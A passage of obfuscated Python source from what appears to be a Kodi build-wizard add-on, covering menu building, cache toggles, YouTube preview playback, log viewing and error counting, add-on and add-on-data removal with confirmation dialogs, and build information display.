		OOOO00000O0000000 .append ((THEME3 %'Save %s Data'%OOO0O000OOOO0OOOO ,'RunPlugin(plugin://%s/?mode=save%s&name=%s)'%(ADDON_ID ,O0O0OOO0OOO0O0O0O ,O0O0000OO00OO0000 )))#line:4142
		OOOO00000O0000000 .append ((THEME3 %'Restore %s Data'%OOO0O000OOOO0OOOO ,'RunPlugin(plugin://%s/?mode=restore%s&name=%s)'%(ADDON_ID ,O0O0OOO0OOO0O0O0O ,O0O0000OO00OO0000 )))#line:4143
		OOOO00000O0000000 .append ((THEME3 %'Clear %s Data'%OOO0O000OOOO0OOOO ,'RunPlugin(plugin://%s/?mode=clear%s&name=%s)'%(ADDON_ID ,O0O0OOO0OOO0O0O0O ,O0O0000OO00OO0000 )))#line:4144
	elif OOOOOO0OO00O0OOO0 =='save':#line:4145
		OOOO00000O0000000 =[]#line:4146
		O0O0OOO0OOO0O0O0O =urllib .quote_plus (O00000OOO0000O000 .lower ().replace (' ',''))#line:4147
		OOO0O000OOOO0OOOO =O00000OOO0000O000 .replace ('Debrid','Real Debrid')#line:4148
		O0O0000OO00OO0000 =urllib .quote_plus (OOOOO0OOO00O0000O .lower ().replace (' ',''))#line:4149
		OOOOO0OOO00O0000O =OOOOO0OOO00O0000O .replace ('url','URL Resolver')#line:4150
		OOOO00000O0000000 .append ((THEME2 %OOOOO0OOO00O0000O .title (),' '))#line:4151
		OOOO00000O0000000 .append ((THEME3 %'Register %s'%OOO0O000OOOO0OOOO ,'RunPlugin(plugin://%s/?mode=auth%s&name=%s)'%(ADDON_ID ,O0O0OOO0OOO0O0O0O ,O0O0000OO00OO0000 )))#line:4152
		OOOO00000O0000000 .append ((THEME3 %'Save %s Data'%OOO0O000OOOO0OOOO ,'RunPlugin(plugin://%s/?mode=save%s&name=%s)'%(ADDON_ID ,O0O0OOO0OOO0O0O0O ,O0O0000OO00OO0000 )))#line:4153
		OOOO00000O0000000 .append ((THEME3 %'Restore %s Data'%OOO0O000OOOO0OOOO ,'RunPlugin(plugin://%s/?mode=restore%s&name=%s)'%(ADDON_ID ,O0O0OOO0OOO0O0O0O ,O0O0000OO00OO0000 )))#line:4154
		OOOO00000O0000000 .append ((THEME3 %'Import %s Data'%OOO0O000OOOO0OOOO ,'RunPlugin(plugin://%s/?mode=import%s&name=%s)'%(ADDON_ID ,O0O0OOO0OOO0O0O0O ,O0O0000OO00OO0000 )))#line:4155
		OOOO00000O0000000 .append ((THEME3 %'Clear Addon %s Data'%OOO0O000OOOO0OOOO ,'RunPlugin(plugin://%s/?mode=addon%s&name=%s)'%(ADDON_ID ,O0O0OOO0OOO0O0O0O ,O0O0000OO00OO0000 )))#line:4156
	elif OOOOOO0OO00O0OOO0 =='install':#line:4157
		OOOO00000O0000000 =[]#line:4158
		O0O0000OO00OO0000 =urllib .quote_plus (OOOOO0OOO00O0000O )#line:4159
		OOOO00000O0000000 .append ((THEME2 %OOOOO0OOO00O0000O ,'RunAddon(%s, ?mode=viewbuild&name=%s)'%(ADDON_ID ,O0O0000OO00OO0000 )))#line:4160
		OOOO00000O0000000 .append ((THEME3 %'Fresh Install','RunPlugin(plugin://%s/?mode=install&name=%s&url=fresh)'%(ADDON_ID ,O0O0000OO00OO0000 )))#line:4161
		OOOO00000O0000000 .append ((THEME3 %'Normal Install','RunPlugin(plugin://%s/?mode=install&name=%s&url=normal)'%(ADDON_ID ,O0O0000OO00OO0000 )))#line:4162
		OOOO00000O0000000 .append ((THEME3 %'Apply guiFix','RunPlugin(plugin://%s/?mode=install&name=%s&url=gui)'%(ADDON_ID ,O0O0000OO00OO0000 )))#line:4163
		OOOO00000O0000000 .append ((THEME3 %'Build Information','RunPlugin(plugin://%s/?mode=buildinfo&name=%s)'%(ADDON_ID ,O0O0000OO00OO0000 )))#line:4164
	OOOO00000O0000000 .append ((THEME2 %'%s Settings'%ADDONTITLE ,'RunPlugin(plugin://%s/?mode=settings)'%ADDON_ID ))#line:4165
	return OOOO00000O0000000 #line:4166
def toggleCache (OO0O0000OO00O000O ):#line:4168
	OO0O0000O0O00OOOO =['includevideo','includeall','includebob','includephoenix','includespecto','includegenesis','includeexodus','includeonechan','includesalts','includesaltslite']#line:4169
	O000O0O000000OO0O =['Include Video Addons','Include All Addons','Include Bob','Include Phoenix','Include Specto','Include Genesis','Include Exodus','Include One Channel','Include Salts','Include Salts Lite HD']#line:4170
	if OO0O0000OO00O000O in ['true','false']:#line:4171
		for OO0OOO0000OOO0OO0 in OO0O0000O0O00OOOO :#line:4172
			wiz .setS (OO0OOO0000OOO0OO0 ,OO0O0000OO00O000O )#line:4173
	else :#line:4174
		if not OO0O0000OO00O000O in ['includevideo','includeall']and wiz .getS ('includeall')=='true':#line:4175
			try :#line:4176
				OO0OOO0000OOO0OO0 =O000O0O000000OO0O [OO0O0000O0O00OOOO .index (OO0O0000OO00O000O )]#line:4177
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]You will need to turn off [COLOR %s]Include All Addons[/COLOR] to disable[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ,OO0OOO0000OOO0OO0 ))#line:4178
			except :#line:4179
				wiz .LogNotify ("[COLOR %s]Toggle Cache[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid id: %s[/COLOR]"%(COLOR2 ,OO0O0000OO00O000O ))#line:4180
		else :#line:4181
			O000O0000000O0000 ='true'if wiz .getS (OO0O0000OO00O000O )=='false'else 'false'#line:4182
			wiz .setS (OO0O0000OO00O000O ,O000O0000000O0000 )#line:4183
def playVideo (O000O000O0O0O0000 ):#line:4185
	wiz .log ("YouTube CCCCCCCCCCCCCCCCCCCCCCCCCCC URL: %s"%O000O000O0O0O0000 )#line:4186
	if 'watch?v='in O000O000O0O0O0000 :#line:4187
		OO000OO0OOOO0OOO0 ,OOO0O0OOO000OOO0O =O000O000O0O0O0000 .split ('?')#line:4188
		O0OOO00OO00O00OO0 =OOO0O0OOO000OOO0O .split ('&')#line:4189
		for OOO0O0O0000OO0000 in O0OOO00OO00O00OO0 :#line:4190
			if OOO0O0O0000OO0000 .startswith ('v='):#line:4191
				O000O000O0O0O0000 =OOO0O0O0000OO0000 [2 :]#line:4192
				break #line:4193
			else :continue #line:4194
	elif 'embed'in O000O000O0O0O0000 or 'youtu.be'in O000O000O0O0O0000 :#line:4195
		wiz .log ("YouTube BBBBBBBBBBBBBBBBBBBBBBBBB URL: %s"%O000O000O0O0O0000 )#line:4196
		OO000OO0OOOO0OOO0 =O000O000O0O0O0000 .split ('/')#line:4197
		if len (OO000OO0OOOO0OOO0 [-1 ])>5 :#line:4198
			O000O000O0O0O0000 =OO000OO0OOOO0OOO0 [-1 ]#line:4199
		elif len (OO000OO0OOOO0OOO0 [-2 ])>5 :#line:4200
			O000O000O0O0O0000 =OO000OO0OOOO0OOO0 [-2 ]#line:4201
	wiz .log ("YouTube URL: %s"%O000O000O0O0O0000 )#line:4202
	yt .PlayVideo (O000O000O0O0O0000 )#line:4203
def viewLogFile ():#line:4205
	O0OO0O0OOO0O0OOO0 =wiz .Grab_Log (True )#line:4206
	O00O0O00000O0OO0O =wiz .Grab_Log (True ,True )#line:4207
	O000OO0000O00OOO0 =0 ;OO0O00OO00O0O0OO0 =O0OO0O0OOO0O0OOO0 #line:4208
	if not O00O0O00000O0OO0O ==False and not O0OO0O0OOO0O0OOO0 ==False :#line:4209
		O000OO0000O00OOO0 =DIALOG .select (ADDONTITLE ,["View %s"%O0OO0O0OOO0O0OOO0 .replace (LOG ,""),"View %s"%O00O0O00000O0OO0O .replace (LOG ,"")])#line:4210
		if O000OO0000O00OOO0 ==-1 :wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]View Log Cancelled![/COLOR]'%COLOR2 );return #line:4211
	elif O0OO0O0OOO0O0OOO0 ==False and O00O0O00000O0OO0O ==False :#line:4212
		wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]No Log File Found![/COLOR]'%COLOR2 )#line:4213
		return #line:4214
	elif not O0OO0O0OOO0O0OOO0 ==False :O000OO0000O00OOO0 =0 #line:4215
	elif not O00O0O00000O0OO0O ==False :O000OO0000O00OOO0 =1 #line:4216
	OO0O00OO00O0O0OO0 =O0OO0O0OOO0O0OOO0 if O000OO0000O00OOO0 ==0 else O00O0O00000O0OO0O #line:4218
	O0OOOO0O0000000O0 =wiz .Grab_Log (False )if O000OO0000O00OOO0 ==0 else wiz .Grab_Log (False ,True )#line:4219
	wiz .TextBox ("%s - %s"%(ADDONTITLE ,OO0O00OO00O0O0OO0 ),O0OOOO0O0000000O0 )#line:4221
def errorChecking (log =None ,count =None ,all =None ):#line:4223
	if log ==None :#line:4224
		O000O0O000OO0OOOO =wiz .Grab_Log (True )#line:4225
		O00OO0000OOO00000 =wiz .Grab_Log (True ,True )#line:4226
		if not O00OO0000OOO00000 ==False and not O000O0O000OO0OOOO ==False :#line:4227
			O0O00O0OOOO0OO000 =DIALOG .select (ADDONTITLE ,["View %s: %s error(s)"%(O000O0O000OO0OOOO .replace (LOG ,""),errorChecking (O000O0O000OO0OOOO ,True ,True )),"View %s: %s error(s)"%(O00OO0000OOO00000 .replace (LOG ,""),errorChecking (O00OO0000OOO00000 ,True ,True ))])#line:4228
			if O0O00O0OOOO0OO000 ==-1 :wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]View Log Cancelled![/COLOR]'%COLOR2 );return #line:4229
		elif O000O0O000OO0OOOO ==False and O00OO0000OOO00000 ==False :#line:4230
			wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]No Log File Found![/COLOR]'%COLOR2 )#line:4231
			return #line:4232
		elif not O000O0O000OO0OOOO ==False :O0O00O0OOOO0OO000 =0 #line:4233
		elif not O00OO0000OOO00000 ==False :O0O00O0OOOO0OO000 =1 #line:4234
		log =O000O0O000OO0OOOO if O0O00O0OOOO0OO000 ==0 else O00OO0000OOO00000 #line:4235
	if log ==False :#line:4236
		if count ==None :#line:4237
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Log File not Found[/COLOR]"%COLOR2 )#line:4238
			return False #line:4239
		else :#line:4240
			return 0 #line:4241
	else :#line:4242
		if os .path .exists (log ):#line:4243
			O0O0O0000OO00OO0O =open (log ,mode ='r');OOO000O0OOOOOOO00 =O0O0O0000OO00OO0O .read ().replace ('\n','').replace ('\r','');O0O0O0000OO00OO0O .close ()#line:4244
			OOOO0O00O0000O00O =re .compile ("-->Python callback/script returned the following error<--(.+?)-->End of Python script error report<--").findall (OOO000O0OOOOOOO00 )#line:4245
			if not count ==None :#line:4246
				if all ==None :#line:4247
					O00O00O0O0000O000 =0 #line:4248
					for OO0OO0000OOOO0O0O in OOOO0O00O0000O00O :#line:4249
						if ADDON_ID in OO0OO0000OOOO0O0O :O00O00O0O0000O000 +=1 #line:4250
					return O00O00O0O0000O000 #line:4251
				else :return len (OOOO0O00O0000O00O )#line:4252
			if len (OOOO0O00O0000O00O )>0 :#line:4253
				O00O00O0O0000O000 =0 ;O0OO0000OO0O00OO0 =""#line:4254
				for OO0OO0000OOOO0O0O in OOOO0O00O0000O00O :#line:4255
					if all ==None and not ADDON_ID in OO0OO0000OOOO0O0O :continue #line:4256
					else :#line:4257
						O00O00O0O0000O000 +=1 #line:4258
						O0OO0000OO0O00OO0 +="[COLOR red]Error Number %s[/COLOR]\n(PythonToCppException) : -->Python callback/script returned the following error<--%s-->End of Python script error report<--\n\n"%(O00O00O0O0000O000 ,OO0OO0000OOOO0O0O .replace ('                                          ','\n').replace ('\\\\','\\').replace (HOME ,''))#line:4259
				if O00O00O0O0000O000 >0 :#line:4260
					wiz .TextBox (ADDONTITLE ,O0OO0000OO0O00OO0 )#line:4261
				else :wiz .LogNotify (ADDONTITLE ,"No Errors Found in Log")#line:4262
			else :wiz .LogNotify (ADDONTITLE ,"No Errors Found in Log")#line:4263
		else :wiz .LogNotify (ADDONTITLE ,"Log File not Found")#line:4264
ACTION_PREVIOUS_MENU =10 #line:4266
ACTION_NAV_BACK =92 #line:4267
ACTION_MOVE_LEFT =1 #line:4268
ACTION_MOVE_RIGHT =2 #line:4269
ACTION_MOVE_UP =3 #line:4270
ACTION_MOVE_DOWN =4 #line:4271
ACTION_MOUSE_WHEEL_UP =104 #line:4272
ACTION_MOUSE_WHEEL_DOWN =105 #line:4273
ACTION_MOVE_MOUSE =107 #line:4274
ACTION_SELECT_ITEM =7 #line:4275
ACTION_BACKSPACE =110 #line:4276
ACTION_MOUSE_LEFT_CLICK =100 #line:4277
ACTION_MOUSE_LONG_CLICK =108 #line:4278
def LogViewer (default =None ):#line:4280
	class OOO0OO00OOOO0O000 (xbmcgui .WindowXMLDialog ):#line:4281
		def __init__ (O00OOO0OOO00O000O ,*O00O0O00O0O00O0OO ,**OO0OO000O00O00OOO ):#line:4282
			O00OOO0OOO00O000O .default =OO0OO000O00O00OOO ['default']#line:4283
		def onInit (OO0O000000O0O0O00 ):#line:4285
			OO0O000000O0O0O00 .title =101 #line:4286
			OO0O000000O0O0O00 .msg =102 #line:4287
			OO0O000000O0O0O00 .scrollbar =103 #line:4288
			OO0O000000O0O0O00 .upload =201 #line:4289
			OO0O000000O0O0O00 .kodi =202 #line:4290
			OO0O000000O0O0O00 .kodiold =203 #line:4291
			OO0O000000O0O0O00 .wizard =204 #line:4292
			OO0O000000O0O0O00 .okbutton =205 #line:4293
			O0O00O00O00O0OOOO =open (OO0O000000O0O0O00 .default ,'r')#line:4294
			OO0O000000O0O0O00 .logmsg =O0O00O00O00O0OOOO .read ()#line:4295
			O0O00O00O00O0OOOO .close ()#line:4296
			OO0O000000O0O0O00 .titlemsg ="%s: %s"%(ADDONTITLE ,OO0O000000O0O0O00 .default .replace (LOG ,'').replace (ADDONDATA ,''))#line:4297
			OO0O000000O0O0O00 .showdialog ()#line:4298
		def showdialog (O0OO000O0000O00O0 ):#line:4300
			O0OO000O0000O00O0 .getControl (O0OO000O0000O00O0 .title ).setLabel (O0OO000O0000O00O0 .titlemsg )#line:4301
			O0OO000O0000O00O0 .getControl (O0OO000O0000O00O0 .msg ).setText (wiz .highlightText (O0OO000O0000O00O0 .logmsg ))#line:4302
			O0OO000O0000O00O0 .setFocusId (O0OO000O0000O00O0 .scrollbar )#line:4303
		def onClick (OO0OOO00000O00O00 ,OOOO000OOO0O00000 ):#line:4305
			if OOOO000OOO0O00000 ==OO0OOO00000O00O00 .okbutton :OO0OOO00000O00O00 .close ()#line:4306
			elif OOOO000OOO0O00000 ==OO0OOO00000O00O00 .upload :OO0OOO00000O00O00 .close ();uploadLog .Main ()#line:4307
			elif OOOO000OOO0O00000 ==OO0OOO00000O00O00 .kodi :#line:4308
				OOOOOO00O00O0O0OO =wiz .Grab_Log (False )#line:4309
				OO0OOOOO00OOOOO00 =wiz .Grab_Log (True )#line:4310
				if OOOOOO00O00O0O0OO ==False :#line:4311
					OO0OOO00000O00O00 .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4312
					OO0OOO00000O00O00 .getControl (OO0OOO00000O00O00 .msg ).setText ("Log File Does Not Exists!")#line:4313
				else :#line:4314
					OO0OOO00000O00O00 .titlemsg ="%s: %s"%(ADDONTITLE ,OO0OOOOO00OOOOO00 .replace (LOG ,''))#line:4315
					OO0OOO00000O00O00 .getControl (OO0OOO00000O00O00 .title ).setLabel (OO0OOO00000O00O00 .titlemsg )#line:4316
					OO0OOO00000O00O00 .getControl (OO0OOO00000O00O00 .msg ).setText (wiz .highlightText (OOOOOO00O00O0O0OO ))#line:4317
					OO0OOO00000O00O00 .setFocusId (OO0OOO00000O00O00 .scrollbar )#line:4318
			elif OOOO000OOO0O00000 ==OO0OOO00000O00O00 .kodiold :#line:4319
				OOOOOO00O00O0O0OO =wiz .Grab_Log (False ,True )#line:4320
				OO0OOOOO00OOOOO00 =wiz .Grab_Log (True ,True )#line:4321
				if OOOOOO00O00O0O0OO ==False :#line:4322
					OO0OOO00000O00O00 .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4323
					OO0OOO00000O00O00 .getControl (OO0OOO00000O00O00 .msg ).setText ("Log File Does Not Exists!")#line:4324
				else :#line:4325
					OO0OOO00000O00O00 .titlemsg ="%s: %s"%(ADDONTITLE ,OO0OOOOO00OOOOO00 .replace (LOG ,''))#line:4326
					OO0OOO00000O00O00 .getControl (OO0OOO00000O00O00 .title ).setLabel (OO0OOO00000O00O00 .titlemsg )#line:4327
					OO0OOO00000O00O00 .getControl (OO0OOO00000O00O00 .msg ).setText (wiz .highlightText (OOOOOO00O00O0O0OO ))#line:4328
					OO0OOO00000O00O00 .setFocusId (OO0OOO00000O00O00 .scrollbar )#line:4329
			elif OOOO000OOO0O00000 ==OO0OOO00000O00O00 .wizard :#line:4330
				OOOOOO00O00O0O0OO =wiz .Grab_Log (False ,False ,True )#line:4331
				OO0OOOOO00OOOOO00 =wiz .Grab_Log (True ,False ,True )#line:4332
				if OOOOOO00O00O0O0OO ==False :#line:4333
					OO0OOO00000O00O00 .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4334
					OO0OOO00000O00O00 .getControl (OO0OOO00000O00O00 .msg ).setText ("Log File Does Not Exists!")#line:4335
				else :#line:4336
					OO0OOO00000O00O00 .titlemsg ="%s: %s"%(ADDONTITLE ,OO0OOOOO00OOOOO00 .replace (ADDONDATA ,''))#line:4337
					OO0OOO00000O00O00 .getControl (OO0OOO00000O00O00 .title ).setLabel (OO0OOO00000O00O00 .titlemsg )#line:4338
					OO0OOO00000O00O00 .getControl (OO0OOO00000O00O00 .msg ).setText (wiz .highlightText (OOOOOO00O00O0O0OO ))#line:4339
					OO0OOO00000O00O00 .setFocusId (OO0OOO00000O00O00 .scrollbar )#line:4340
		def onAction (OO0OOOOOO00O00OO0 ,OOO0O0OO00000000O ):#line:4342
			if OOO0O0OO00000000O ==ACTION_PREVIOUS_MENU :OO0OOOOOO00O00OO0 .close ()#line:4343
			elif OOO0O0OO00000000O ==ACTION_NAV_BACK :OO0OOOOOO00O00OO0 .close ()#line:4344
	if default ==None :default =wiz .Grab_Log (True )#line:4345
	O0O0O00000OO0000O =OOO0OO00OOOO0O000 ("LogViewer.xml",ADDON .getAddonInfo ('path'),'DefaultSkin',default =default )#line:4346
	O0O0O00000OO0000O .doModal ()#line:4347
	del O0O0O00000OO0000O #line:4348
def removeAddon (OO0OO000O000O00O0 ,O0O0O00OOOO0O0O00 ,over =False ):#line:4350
	if not over ==False :#line:4351
		OO0O0O0OO00O00O0O =1 #line:4352
	else :#line:4353
		OO0O0O0OO00O00O0O =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Are you sure you want to delete the addon:'%COLOR2 ,'Name: [COLOR %s]%s[/COLOR]'%(COLOR1 ,O0O0O00OOOO0O0O00 ),'ID: [COLOR %s]%s[/COLOR][/COLOR]'%(COLOR1 ,OO0OO000O000O00O0 ),yeslabel ='[B][COLOR green]Remove Addon[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]')#line:4354
	if OO0O0O0OO00O00O0O ==1 :#line:4355
		OO00O00O0000OOO00 =os .path .join (ADDONS ,OO0OO000O000O00O0 )#line:4356
		wiz .log ("Removing Addon %s"%OO0OO000O000O00O0 )#line:4357
		wiz .cleanHouse (OO00O00O0000OOO00 )#line:4358
		xbmc .sleep (1000 )#line:4359
		try :shutil .rmtree (OO00O00O0000OOO00 )#line:4360
		except Exception as O0OOO0O000O000000 :wiz .log ("Error removing %s"%OO0OO000O000O00O0 ,xbmc .LOGNOTICE )#line:4361
		removeAddonData (OO0OO000O000O00O0 ,O0O0O00OOOO0O0O00 ,over )#line:4362
	if over ==False :#line:4363
		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]%s Removed[/COLOR]"%(COLOR2 ,O0O0O00OOOO0O0O00 ))#line:4364
def removeAddonData (OOO00OOO0OO00O00O ,name =None ,over =False ):#line:4366
	if OOO00OOO0OO00O00O =='all':#line:4367
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4368
			wiz .cleanHouse (ADDOND )#line:4369
		else :wiz .LogNotify ('[COLOR %s]Remove Addon Data[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4370
	elif OOO00OOO0OO00O00O =='uninstalled':#line:4371
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder for uninstalled addons?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4372
			OOOOOO0O00O00OOO0 =0 #line:4373
			for O00OOO0O00OO00OO0 in glob .glob (os .path .join (ADDOND ,'*')):#line:4374
				OOO00OOOO000OO0OO =O00OOO0O00OO00OO0 .replace (ADDOND ,'').replace ('\\','').replace ('/','')#line:4375
				if OOO00OOOO000OO0OO in EXCLUDES :pass #line:4376
				elif os .path .exists (os .path .join (ADDONS ,OOO00OOOO000OO0OO )):pass #line:4377
				else :wiz .cleanHouse (O00OOO0O00OO00OO0 );OOOOOO0O00O00OOO0 +=1 ;wiz .log (O00OOO0O00OO00OO0 );shutil .rmtree (O00OOO0O00OO00OO0 )#line:4378
			wiz .LogNotify ('[COLOR %s]Clean up Uninstalled[/COLOR]'%COLOR1 ,'[COLOR %s]%s Folders(s) Removed[/COLOR]'%(COLOR2 ,OOOOOO0O00O00OOO0 ))#line:4379
		else :wiz .LogNotify ('[COLOR %s]Remove Addon Data[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4380
	elif OOO00OOO0OO00O00O =='empty':#line:4381
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] empty addon data folders in you Userdata folder?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4382
			OOOOOO0O00O00OOO0 =wiz .emptyfolder (ADDOND )#line:4383
			wiz .LogNotify ('[COLOR %s]Remove Empty Folders[/COLOR]'%COLOR1 ,'[COLOR %s]%s Folders(s) Removed[/COLOR]'%(COLOR2 ,OOOOOO0O00O00OOO0 ))#line:4384
		else :wiz .LogNotify ('[COLOR %s]Remove Empty Folders[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4385
	else :#line:4386
		O00O0O00O00O000OO =os .path .join (USERDATA ,'addon_data',OOO00OOO0OO00O00O )#line:4387
		if OOO00OOO0OO00O00O in EXCLUDES :#line:4388
			wiz .LogNotify ("[COLOR %s]Protected Plugin[/COLOR]"%COLOR1 ,"[COLOR %s]Not allowed to remove Addon_Data[/COLOR]"%COLOR2 )#line:4389
		elif os .path .exists (O00O0O00O00O000OO ):#line:4390
			if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you also like to remove the addon data for:[/COLOR]'%COLOR2 ,'[COLOR %s]%s[/COLOR]'%(COLOR1 ,OOO00OOO0OO00O00O ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4391
				wiz .cleanHouse (O00O0O00O00O000OO )#line:4392
				try :#line:4393
					shutil .rmtree (O00O0O00O00O000OO )#line:4394
				except :#line:4395
					wiz .log ("Error deleting: %s"%O00O0O00O00O000OO )#line:4396
			else :#line:4397
				wiz .log ('Addon data for %s was not removed'%OOO00OOO0OO00O00O )#line:4398
	wiz .refresh ()#line:4399
def restoreit (OO0O00OO00OO0O0O0 ):#line:4401
	if OO0O00OO00OO0O0O0 =='build':#line:4402
		OOOOO0O0OO00OOOO0 =freshStart ('restore')#line:4403
		if OOOOO0O0OO00OOOO0 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Local Restore Cancelled[/COLOR]"%COLOR2 );return #line:4404
	if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary']:#line:4405
		wiz .skinToDefault ()#line:4406
	wiz .restoreLocal (OO0O00OO00OO0O0O0 )#line:4407
def restoreextit (O00OO0000OO0O0000 ):#line:4409
	if O00OO0000OO0O0000 =='build':#line:4410
		OOO0OOO00O0O0OOOO =freshStart ('restore')#line:4411
		if OOO0OOO00O0O0OOOO ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]External Restore Cancelled[/COLOR]"%COLOR2 );return #line:4412
	wiz .restoreExternal (O00OO0000OO0O0000 )#line:4413
def buildInfo (O000OOO0OOO0O0000 ):#line:4415
	if wiz .workingURL (SPEEDFILE )==True :#line:4416
		if wiz .checkBuild (O000OOO0OOO0O0000 ,'url'):#line:4417
			O000OOO0OOO0O0000 ,O000O0O000O0O0OO0 ,O0OOO00O000OOOOO0 ,OOO0000OOOO00O0O0 ,O000OOOOO0O00O00O ,OO000O000O0O00O00 ,O00OO0O000OOOO0OO ,OO00000O0OO000O0O ,OO0OOO00OO0000OO0 ,OOOO0O0OOO00O0OO0 ,OO0O00OO0OO00O0O0 =wiz .checkBuild (O000OOO0OOO0O0000 ,'all')#line:4418
			OOOO0O0OOO00O0OO0 ='Yes'if OOOO0O0OOO00O0OO0 .lower ()=='yes'else 'No'#line:4419
			OOO000000O00O0OOO ="[COLOR %s]שם הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O000OOO0OOO0O0000 )#line:4420
			OOO000000O00O0OOO +="[COLOR %s]גירסת הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O000O0O000O0O0OO0 )#line:4421
			if not OO000O000O0O00O00 =="http://":#line:4422
				OO0O00OO0OOOOOO00 =wiz .themeCount (O000OOO0OOO0O0000 ,False )#line:4423
				OOO000000O00O0OOO +="[COLOR %s]Build Theme(s):[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,', '.join (OO0O00OO0OOOOOO00 ))#line:4424
			OOO000000O00O0OOO +="[COLOR %s]קודי גירסה:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O000OOOOO0O00O00O )#line:4425
			OOO000000O00O0OOO +="[COLOR %s]Adult Content:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OOOO0O0OOO00O0OO0 )#line:4426
			OOO000000O00O0OOO +="[COLOR %s]תאור:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OO0O00OO0OO00O0O0 )#line:4427
			wiz .TextBox (ADDONTITLE ,OOO000000O00O0OOO )#line:4428
		else :wiz .log ("Invalid Build Name!")#line:4429
	else :wiz .log ("Build text file not working: %s"%WORKINGURL )#line:4430
def buildVideo (OO0O0000O0000O000 ):#line:4432
	wiz .log ("DDDDDDDDDDDDDDDDDDDDDDDDD: %s"%wiz .workingURL (SPEEDFILE ))#line:4433
	if wiz .workingURL (SPEEDFILE )==True :#line:4434
		OOOOO00000OO00000 =wiz .checkBuild (OO0O0000O0000O000 ,'preview')#line:4435
		wiz .log ("FFFFFFFFFFFFFFFFFFFFFFFFFF: %s"%OO0O0000O0000O000 )#line:4436
		if OOOOO00000OO00000 and not OOOOO00000OO00000 =='http://':playVideo (OOOOO00000OO00000 )#line:4437
		else :wiz .log ("[%s]Unable to find url for video preview"%OO0O0000O0000O000 )#line:4438
	else :wiz .log ("Build text file not working: %s"%WORKINGURL )#line:4439
def dependsList (OO00O0O00OO0O0000 ):#line:4441
	OO0000OO0O00O00O0 =os .path .join (ADDONS ,OO00O0O00OO0O0000 ,'addon.xml')#line:4442
	if os .path .exists (OO0000OO0O00O00O0 ):#line:4443
		O00OO00O0OO00OO0O =open (OO0000OO0O00O00O0 ,mode ='r');OO00O00OOOOOOOO0O =O00OO00O0OO00OO0O .read ();O00OO00O0OO00OO0O .close ();#line:4444
		OOOO000OOOOOOO000 =wiz .parseDOM (OO00O00OOOOOOOO0O ,'import',ret ='addon')#line:4445
		OO0O0OO000OOOOO0O =[]#line:4446
		for OOOOO000000OO0O00 in OOOO000OOOOOOO000 :#line:4447
			if not 'xbmc.python'in OOOOO000000OO0O00 :#line:4448
				OO0O0OO000OOOOO0O .append (OOOOO000000OO0O00 )#line:4449
		return OO0O0OO000OOOOO0O #line:4450
	return []#line:4451
def manageSaveData (O0O0OO0OO0OOOOOO0 ):#line:4453
	if O0O0OO0OO0OOOOOO0 =='import':#line:4454
		OOO0O0OO0OOO00O0O =os .path .join (ADDONDATA ,'temp')#line:4455
		if not os .path .exists (OOO0O0OO0OOO00O0O ):os .makedirs (OOO0O0OO0OOO00O0O )#line:4456
		OO0OOOO0O0OOOO000 =DIALOG .browse (1 ,'[COLOR %s]Select the location of the SaveData.zip[/COLOR]'%COLOR2 ,'files','.zip',False ,False ,HOME )#line:4457
		if not OO0OOOO0O0OOOO000 .endswith ('.zip'):#line:4458
